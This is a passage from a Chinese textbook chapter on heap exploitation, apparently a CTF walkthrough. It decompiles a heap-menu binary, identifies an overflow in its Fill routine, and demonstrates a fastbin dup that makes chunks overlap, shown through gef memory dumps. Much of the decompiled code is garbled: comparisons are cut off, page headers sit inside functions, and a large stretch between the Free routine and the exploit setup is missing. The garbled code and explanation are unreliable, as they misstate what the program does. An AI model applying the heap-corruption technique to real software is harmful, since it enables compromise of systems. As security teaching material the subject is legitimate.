PIE enabled
程序分析
使用 IDA 进行逆向分析，程序可分为 Allocate、Fill、Free 和 Dump 四个部分。我们先来看负责
分配堆块的 Allocate 部分。
void __fastcall sub_D48(__int64 a1) {
signed int i; // [rsp+10h] [rbp-10h]
signed int v2; // [rsp+14h] [rbp-Ch]
void *v3; // [rsp+18h] [rbp-8h]
for ( i = 0; i  0 ) {
if ( v2 > 0x1000 )
v2 = 0x1000;
v3 = calloc(v2, 1uLL);
// buf
if ( !v3 )
exit(-1);
*(_DWORD *)(0x18LL * i + a1) = 1;
// table[i].in_use
*(_QWORD *)(a1 + 0x18LL * i + 8) = v2;
// table[i].size
第 11 章
堆利用 ┃ LIX
*(_QWORD *)(a1 + 0x18LL * i + 0x10) = v3;// table[i].buf_ptr
printf("Allocate Index %d\n", (unsigned int)i);
}
return;
}
}
}
参数 a1 是 sub_B70 函数的返回值，是一个随机生成的内存地址，在该地址上通过 mmap 系统调
用开辟了一段内存空间，用于存放最多 16 个结构体，我们暂且称它为 table，每个结构体包含 in_use、
size 和 buf_ptr 三个域，分别表示堆块是否在使用、堆块大小和指向堆块缓冲区的指针。至于这里为
什么特意使用了 mmap，我们后面再解释。sub_D48 函数通过遍历找到第一个未被使用的结构体，然
后请求读入一个数作为 size，并分配 size 大小的堆块，最后更新该结构体。需要注意的是，这里使
用 calloc()而不是 malloc()作为堆块分配函数，意味着所得到的内存空间被初始化为 0。
然后来看负责填充的 Fill 部分。该函数首先读入一个数作为索引，找到其对应的结构体并判断
该结构体是否被使用，如果是，则读入第二个数作为 size，然后将该结构体的 buf_ptr 域和 size 作为
参数调用函数 sub_11B2()。
__int64 __fastcall sub_E7F(__int64 a1) {
__int64 result; // rax
int v2; // [rsp+18h] [rbp-8h]
int v3; // [rsp+1Ch] [rbp-4h]
printf("Index: ");
result = sub_138C();
// index
v2 = result;
if ( (signed int)result >= 0 && (signed int)result  0 ) {
printf("Content: ");
result = sub_11B2(*(_QWORD *)(0x18LL * v2 + a1 + 0x10), v3);
// table[v2].buf_ptr, size
}
}
}
return result;
}
于是我们转到 sub_11B2()，该函数用于读入 a2 个字符到 a1 地址处。while 的逻辑保证了一定且
只能够读入 a2 个字符，但对于得到的字符串是否以“\n”结尾并不关心，这就为信息泄露埋下了隐
患。
unsigned __int64 __fastcall sub_11B2(__int64 a1, unsigned __int64 a2) {
第 11 章
堆利用 ┃ LX
unsigned __int64 v3; // [rsp+10h] [rbp-10h]
ssize_t v4; // [rsp+18h] [rbp-8h]
if ( !a2 )
return 0LL;
v3 = 0LL;
while ( v3  0 ) {
v3 += v4;
}
else if ( *_errno_location() != 11 && *_errno_location() != 4 ) {
return v3;
}
}
return v3;
}
接下来是负责释放堆块的 Free 部分。该函数同样读入一个数作为索引，并找到对应的结构体，
释放堆块缓冲区，并将全部域清零。
__int64 __fastcall sub_F50(__int64 a1) {
__int64 result; // rax
int v2; // [rsp+1Ch] [rbp-4h]
printf("Index: ");
result = sub_138C();
// index
v2 = result;
if ( (signed int)result >= 0 && (signed int)result fd 指向 chunk1。如果利用堆溢
出漏洞修改 chunk2->fd，使其指向 chunk4，就可以将 small chunk 链接到 fastbin 中，当然还需要把
chunk4->size 的 0x91 改成 0x21 以绕过 malloc 对 fastbin chunk 大小的检查。
思考一下，其实我们并不知道 heap 的地址，因为它是随机的，但是我们知道 heap 起始地址的
低位字节一定是 0x00，从而推测出 chunk4 的低位字节一定是 0x80。于是我们也可以回答为什么在
申请 table 空间的时候使用 mmap 系统调用，而不是 malloc 系列函数，就是为了保证 chunk 是从 heap
的起始地址开始分配的。结果如下所示。
gef➤
x/36gx 0x000055620ca32000
0x55620ca32000: 0x0000000000000000
0x0000000000000021
# chunk0
0x55620ca32010: 0x4141414141414141
0x4141414141414141
0x55620ca32020: 0x0000000000000000
0x0000000000000021
# chunk1 [free]
0x55620ca32030: 0x0000000000000000
0x4141414141414141
0x55620ca32040: 0x0000000000000000
0x0000000000000021
# chunk2 [free]
0x55620ca32050: 0x000055620ca32080
0x0000000000000000
0x55620ca32060: 0x0000000000000000
0x0000000000000021
# chunk3
0x55620ca32070: 0x4141414141414141
0x4141414141414141
0x55620ca32080: 0x0000000000000000
0x0000000000000021
# chunk4
0x55620ca32090: 0x0000000000000000
0x0000000000000000
......
0x55620ca32100: 0x0000000000000000
0x0000000000000000
0x55620ca32110: 0x0000000000000000
0x0000000000020ef1
# top chunk
此时我们只需要再次申请空间，根据 fastbins 后进先出的机制，即可在原 chunk2 的位置创建一
个 new chunk1，在 chunk4 的位置创造一个重叠的 new chunk2，也就是本节所讲的 fastbin dup。
gef➤
x/36gx 0x000055620ca32000
0x55620ca32000: 0x0000000000000000
0x0000000000000021
# chunk0
0x55620ca32010: 0x4141414141414141
0x4141414141414141
0x55620ca32020: 0x0000000000000000
0x0000000000000021
# chunk1 [free]
0x55620ca32030: 0x0000000000000000
0x4141414141414141
0x55620ca32040: 0x0000000000000000
0x0000000000000021
# new chunk1
0x55620ca32050: 0x0000000000000000
0x0000000000000000
0x55620ca32060: 0x0000000000000000
0x0000000000000021
# chunk3